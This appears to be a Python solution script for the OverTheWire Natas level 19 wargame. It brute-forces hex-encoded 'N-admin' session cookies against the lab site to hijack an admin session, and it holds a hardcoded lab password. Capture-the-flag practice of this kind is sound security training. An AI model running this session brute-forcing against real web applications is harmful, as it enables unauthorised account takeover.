#!/usr/bin/python3

import requests, binascii

url = "http://natas19.natas.labs.overthewire.org/index.php"

s = requests.Session()
s.auth = ('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
r = s.get(url)

for x in range(1000):
    tmp = str(x) + "-admin"
    val = binascii.hexlify(tmp.encode('utf-8'))
    
    cookies = dict(PHPSESSID=val.decode('ascii'))
    r = s.get (url, cookies=cookies)

    if "Login as an admin" in r.text:
        pass
    else:
        print(r.text)
        print(tmp)
        break
